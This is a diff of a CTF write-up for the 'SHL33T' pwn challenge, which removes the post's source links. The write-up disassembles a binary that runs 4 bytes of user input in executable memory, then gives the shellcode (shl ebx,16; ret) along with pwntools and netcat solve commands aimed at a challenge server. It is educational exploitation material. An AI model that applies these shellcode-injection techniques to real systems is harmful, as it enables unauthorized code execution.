@@ -1,26 +1,18 @@
 # :locked_with_key: University CTF 2025 Writeup: SHL33T Challenge
 
-> **Original Source:** [University CTF 2025 Writeup: SHL33T Challenge](https://yudhiatmadja.medium.com/university-ctf-2025-writeup-shl33t-challenge-522a0726aa75)
-> **Platform:** yudhiatmadja.medium.com | **Category:** `CRYPTO` | **Year:** 2025
-
 ---
 
 # University CTF 2025 Writeup: SHL33T Challenge
 
-
 Category: PWN
-
 
 Challenge Name: SHL33T
 
 ## Challenge Description
 
-
 The mischievous elves have tampered with Nibbletop’s registers — most notably the EBX register — and now he’s stuck, unable to continue delivering Christmas gifts. Can you step in, restore his register, and save Christmas once again for everyone?
 
-
 Files Provided:
-
 
 - `shl33t` - 64-bit ELF executable
 
@@ -28,26 +20,20 @@ Files Provided:
 
 ## Initial Analysis
 
-
 ## Binary Protection Check
-
 
 ```
 checksec --file=shl33t
 ```
 
-
 Results:
-
 
 ```
 RELRO STACK CANARY NX PIE
 Full RELRO Canary found NX enabled PIE enabled
 ```
 
-
 All modern protections are enabled:
-
 
 - Full RELRO: GOT cannot be overwritten
 
@@ -59,17 +45,13 @@ All modern protections are enabled:
 
 - Architecture: x86–64 (64-bit)
 
-
 Running the Binary
-
 
 ```
 ./shl33t
 ```
 
-
 Output:
-
 
 ```
 [ASCII Art of Christmas Tree]
@@ -83,9 +65,7 @@ Output:
 $
 ```
 
-
 The program clearly tells us:
-
 
 - Current EBX value: `0x00001337`
 
@@ -95,9 +75,7 @@ The program clearly tells us:
 
 ## Reverse Engineering
 
-
 ## Static Analysis with Radare2
-
 
 ```
 r2 -AA ./shl33t
@@ -105,9 +83,7 @@ r2 -AA ./shl33t
 [0x00001260]> pdf @main # Disassemble main function
 ```
 
-
 Key Functions Found
-
 
 ```
 0x00001521 sym.fail - Called when EBX check fails
@@ -118,20 +94,15 @@ Key Functions Found
 0x00001988 main - Main function
 ```
 
-
 ## Critical Code Analysis in `main`
 
-
 - Setting EBX to 0x1337 (main+73):
-
 
 ```
 0x000019d1 mov $0x1337,%ebx
 ```
 
-
 2. Creating Executable Memory:
-
 
 ```
 0x00001a12 mov $0x0,%r9d ; offset = 0
@@ -143,12 +114,9 @@ Key Functions Found
 0x00001a32 call mmap@plt ; Allocate RWX memory
 ```
 
-
 The program allocates 4096 bytes of RWX (Read-Write-Execute) memory. This is the key vulnerability.
 
-
 3. Reading User Input (4 bytes):
-
 
 ```
 0x00001a5b mov -0x30(%rbp),%rax ; Get mmap'd buffer address
@@ -158,9 +126,7 @@ The program allocates 4096 bytes of RWX (Read-Write-Execute) memory. This is the
 0x00001a6c call read@plt ; Read input
 ```
 
-
 4. Executing Our Shellcode:
-
 
 ```
 0x00001a9a mov -0x30(%rbp),%rax ; Load shellcode address
@@ -169,12 +135,9 @@ The program allocates 4096 bytes of RWX (Read-Write-Execute) memory. This is the
 0x00001aa6 call *%rax ; Execute our 4-byte shellcode!
 ```
 
-
 After execution, control returns back to main.
 
-
 5. Checking EBX Value:
-
 
 ```
 0x00001aa8 mov %ebx,%eax
@@ -183,9 +146,7 @@ After execution, control returns back to main.
 0x00001ab4 jne 0x1af2 <main+362> ; Jump to fail if not equal
 ```
 
-
 6. Success Path:
-
 
 ```
 0x00001ab6 lea 0x1463(%rip),%rax ; Load success message
@@ -196,26 +157,20 @@ After execution, control returns back to main.
 0x00001ad4 call system@plt ; Execute: system("cat flag.txt")
 ```
 
-
 If `EBX == 0x13370000`, the program executes `system("cat flag.txt")` and prints the flag!
 
 ## Solution Strategy
 
-
 ## Understanding the Transformation
 
-
 We need to transform the EBX register:
-
 
 ```
 From: 0x00001337
 To: 0x13370000
 ```
 
-
 Binary Analysis
-
 
 ```
 0x00001337 in binary:
@@ -225,49 +180,38 @@ Binary Analysis
 0001 0011 0011 0111 0000 0000 0000 0000
 ```
 
-
 Observation: The value `0x1337` is moved 16 bits to the left!
 
 ## Mathematical Solution
-
 
 ```
 0x1337 << 16 = 0x13370000
 ```
 
-
 This is a left shift by 16 bits operation.
 
 ## Assembly Instruction
 
-
 In x86–64 assembly, we use the `SHL` (Shift Left) instruction:
-
 
 ```
 shl ebx, 16 ; Shift EBX left by 16 bits (0x10 in hex)
 ret ; Return to caller (main function)
 ```
 
-
 ## Opcode Generation
 
-
 Using `pwntools` or an assembler:
-
 
 - `shl ebx, 16` → Opcode: `C1 E3 10`
 
 - `ret` → Opcode: `C3`
 
-
 Complete shellcode: `C1 E3 10 C3` (4 bytes total - perfect!)
 
 ## Exploitation
 
-
 ## Full Exploit Script
-
 
 ```
 #!/usr/bin/env python3
@@ -367,28 +311,21 @@ if __name__ == "__main__":
 main()
 ```
 
-
 ## Running the Exploit
 
-
 For local testing:
-
 
 ```
 python3 solve.py
 ```
 
-
 For remote server:
-
 
 ```
 python3 solve.py REMOTE HOST=<target_ip> PORT=<target_port>
 ```
 
-
 Example Execution
-
 
 ```
 $ python3 solve.py REMOTE HOST=154.57.164.72 PORT=30921
@@ -426,12 +363,9 @@ HTB{[REDACTED]}
 [+] SUCCESS! Flag captured!
 ```
 
-
 ## Alternative Solutions
 
-
 ## Method 1: Manual with netcat
-
 
 ```
 # Create shellcode file
@@ -441,17 +375,13 @@ echo -ne '\xc1\xe3\x10\xc3' > shellcode.bin
 cat shellcode.bin - | nc <host> <port>
 ```
 
-
 Method 2: One-liner with pwntools
-
 
 ```
 python3 -c "from pwn import *; p=remote('host',port); p.recvuntil(b'$ '); p.send(asm('shl ebx,16;ret')); print(p.recvall().decode())"
 ```
 
-
 Method 3: Using raw bytes
-
 
 ```
 from pwn import *
@@ -461,20 +391,15 @@ p.send(b'\xc1\xe3\x10\xc3') # Direct opcode bytes
 print(p.recvall().decode())
 ```
 
-
 ## Key Takeaways
 
-
 ## 1. Challenge Name as Hint
-
 
 The name “SHLeet” is a wordplay on “sheet” and directly hints at the SHL (Shift Left) x86 instruction needed to solve the challenge.
 
 ## 2. Intended Vulnerability
 
-
 Despite all security protections (PIE, NX, Stack Canary, Full RELRO), the program intentionally:
-
 
 - Creates RWX (executable) memory with `mmap`
 
@@ -482,11 +407,9 @@ Despite all security protections (PIE, NX, Stack Canary, Full RELRO), the progra
 
 - Executes our code and checks the result
 
-
 This is an intended vulnerability for educational purposes.
 
 ## 3. Why Traditional Exploits Don’t Work
-
 
 - Stack Canary: Prevents classic buffer overflows
 
@@ -498,38 +421,29 @@ This is an intended vulnerability for educational purposes.
 
 ## 4. Register Manipulation
 
-
 Understanding how CPU registers work and how to manipulate them with minimal shellcode (only 4 bytes!) is crucial for this challenge.
 
 ## 5. Opcode Knowledge
-
 
 Knowing x86–64 opcodes or being able to generate them with tools like `pwntools` is essential for shellcode-based challenges.
 
 ## x86–64 Assembly Reference
 
-
 ## SHL Instruction
 
-
 Syntax:
-
 
 ```
 shl destination, count
 ```
 
-
 Example:
-
 
 ```
 shl ebx, 16 ; Shift EBX left by 16 bits
 ```
 
-
 Opcode: `C1 E3 10`
-
 
 - `C1` - SHL instruction prefix
 
@@ -539,21 +453,14 @@ Opcode: `C1 E3 10`
 
 ## RET Instruction
 
-
 Syntax:
-
 
 ```
 ret
 ```
 
-
 Opcode: `C3`
-
 
 Returns control to the calling function by popping the return address from the stack and jumping to it.
 
 ---
-
-*Originally published on [Medium](https://yudhiatmadja.medium.com/university-ctf-2025-writeup-shl33t-challenge-522a0726aa75). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of crypto CTF writeups.*
